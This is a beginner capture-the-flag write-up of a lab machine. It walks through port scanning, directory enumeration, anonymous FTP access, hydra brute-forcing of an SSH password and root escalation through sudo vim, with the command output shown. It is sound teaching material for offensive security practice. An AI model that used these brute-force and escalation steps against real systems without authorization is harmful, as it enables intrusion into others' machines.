<h1 align="center">Challenge 037 - Simple CTF </h1>
<div align="center">
  <img src="https://github.com/user-attachments/assets/1a34796f-1d10-4f2e-b8c9-5e069b022c00" alt="SimpleCTF" width="500" height="500" />
</div>
<br>
<p align="center"> <b>Difficulty</b>: 1/10 (Very Easy) <b>Completed</b>: ✔️ 07.10.2025 </p>

This is a CTF that I left in the backburner and never finished even though it's supposed to be pretty simple. I will go through it to see if I improved in regards to web exploitation and privilege escalation.

First things first the task expects us to scan the ports as always, so we get nmap running

```
root@ip-10-10-156-103:~# nmap -p- -sV -A 10.10.196.217
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-07 16:33 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.196.217
Host is up (0.00075s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.156.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
MAC Address: 02:A8:65:5F:21:65 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.75 ms 10.10.196.217

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.12 seconds
```

The first question asks us how many services are running under port 1000. That would be 2. The first one being the ftp on port 21 and http on port 80. The second question was asking what was running on the higher port, which is ssh. For some reason it's running on port 2222 instead of 22. Okay then.

As we have a web site we can look at we check it out.

<img width="969" height="875" alt="image" src="https://github.com/user-attachments/assets/5e4dbffe-f9ce-4d03-bc01-898afe863929" />

It's another Apache Default Page. How boring. It also can't really help us with the next question we are being asked, which is what's the CVE we are using against the application. There is no exploit known to me, which we can use against any of these versions, so I wasn't sure what was being asked of me. The scan revealed that there was a robots.txt directory, so we might as well check that out.

<img width="559" height="570" alt="Bildschirmfoto vom 2025-10-07 18-40-21" src="https://github.com/user-attachments/assets/6c129b5d-1fea-40cd-b25e-6641224e3ba1" />

After seeing the only two things I can deduce is that there is a user mike, with which we may be able to get access to the shell later on. We keep that in mind. But we also find out that a directory that is disallowed is */openemr-5_0_1_3*. We try to check it out, but get a 404.

<img width="568" height="229" alt="image" src="https://github.com/user-attachments/assets/ed9e249e-a2fb-48fa-9821-7f9b8238747f" />

Too bad. We can try to use gobuster to find some hidden directories though. Let's just do that.

```
root@ip-10-10-156-103:~# gobuster dir -u http://10.10.196.217 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.196.217
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htpasswd            (Status: 403) [Size: 297]
/.htaccess            (Status: 403) [Size: 297]
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 301]
/simple               (Status: 301) [Size: 315] [--> http://10.10.196.217/simple/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Looks like the directory simple could be interesting for us.

<img width="1159" height="832" alt="image" src="https://github.com/user-attachments/assets/99be56c7-f285-441e-ad87-dac049a52eb4" />

Well, well, well. What do we have here? Seems to be a freshly installed CMS application called CMS Made Simple. Maybe we can find an exploit for this version of the system?

<img width="317" height="125" alt="image" src="https://github.com/user-attachments/assets/f3cf93e7-4a3c-4694-b29c-bba2ef298a7a" />

We check out the version of this CMS and use Google to be enlightened.

<img width="882" height="275" alt="image" src="https://github.com/user-attachments/assets/579ef7ce-f0d5-4816-84ca-99ded8029eaf" />

Alright, alright. Let's just click on that first link to find out more

<img width="1034" height="380" alt="image" src="https://github.com/user-attachments/assets/d59c6672-da8e-49b9-8dfe-ccc7a5ee6162" />

That answers not only the CVE we can use against the application but also the type of vulnerability that we can use.

It's a CVE-2019-9053 and we can use blind time-based *SQL injection*. This is another attack vector we can make use of. But before I could do that I quickly wanted to check out the FTP port too, as we are able to login to it.

As the FTP port clearly states an anonymous login is allowed we do just that

```
root@ip-10-10-156-103:~# ftp 10.10.196.217
Connected to 10.10.196.217.
220 (vsFTPd 3.0.3)
Name (10.10.196.217:root): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

That worked beautifully. Now it was time to retrieve all files that could be interesting, which in this case was just one text file.

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> type ascii
200 Switching to ASCII mode.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
166 bytes received in 0.00 secs (306.4449 kB/s)
ftp> quit
221 Goodbye.
```

We check it out by cat'ing.

```
root@ip-10-10-156-103:~# cat ForMitch.txt
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

Umm... that looks bad. Well for them. We know that Mitch is the username. Now we only have to use hydra to find out the password by bruteforcing.

```
root@ip-10-10-156-103:~# hydra -l mitch -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://10.10.196.217
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-07 17:05:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.196.217:2222/
[2222][ssh] host: 10.10.196.217   login: mitch   password: secret
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-07 17:05:27
```

Sweet. Looks like the password is secret. That answers the next question of the CTF. And with that we can access and login to the ssh shell.

```
root@ip-10-10-156-103:~# ssh -p 2222 mitch@10.10.196.217
mitch@10.10.196.217's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ whoami
mitch
```

Mwah 💋. There we have it. Now let's just cat the user.txt

```
$ ls -la
total 36
drwxr-x--- 3 mitch mitch 4096 aug 19  2019 .
drwxr-xr-x 4 root  root  4096 aug 17  2019 ..
-rw------- 1 mitch mitch  178 aug 17  2019 .bash_history
-rw-r--r-- 1 mitch mitch  220 sep  1  2015 .bash_logout
-rw-r--r-- 1 mitch mitch 3771 sep  1  2015 .bashrc
drwx------ 2 mitch mitch 4096 aug 19  2019 .cache
-rw-r--r-- 1 mitch mitch  655 mai 16  2017 .profile
-rw-rw-r-- 1 mitch mitch   19 aug 17  2019 user.txt
-rw------- 1 mitch mitch  515 aug 17  2019 .viminfo
$ cat user.txt
```

As the challenge is also asking us if there is any other user we can see in the home directory, we jump out of the directory and see through *ls* that the other user is called sunbath.

Just out of interest I wanted to check out the bash history of mitch, but I didn't find anything worthwhile. 

Where I found something interesting though is when I checked out what commands mitch would be able to run as sudo.

```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

We can leverage vim to spawn a priviliged shell. Now we check out our favorite website GTFOBins to see which command we have to run for this to work

<img width="820" height="268" alt="Bildschirmfoto vom 2025-10-07 18-32-53" src="https://github.com/user-attachments/assets/733a9030-5199-453b-bfb9-372675a73bc3" />

Working with the second option and replacing sudo with /usr/bin/vim and python with python3 gave us the possibility to escalate our priviliges to root. For some reason we weren't able to confirm it, but we were definetely able to access the root directory now and cat the flag that is stored in there.

```
# whoami
sh: 1: ot found
sh: 1: 2Rwhoami: not found
# ls
mitch  sunbath
# cd ..
# ls
bin    dev   initrd.img      lost+found  opt   run   srv  usr	   vmlinuz.old
boot   etc   initrd.img.old  media	 proc  sbin  sys  var
cdrom  home  lib	     mnt	 root  snap  tmp  vmlinuz
# cd root
# ls
root.txt
# cat root.txt
```

That was a fun beginner friendly CTF, which made me realize that we didn't even have to exploit the CMS through SQLinjection. It's probably another way we could have gotten the password for mitch, which is very exciting. When I have the time I will maybe return to this CTF and see what happens if we just follow suit with that exploit. It definetely is a good challenge to get acquainted with the basic Web Exploitations and Shell Privilege escalation techniques. I can only recommend it.
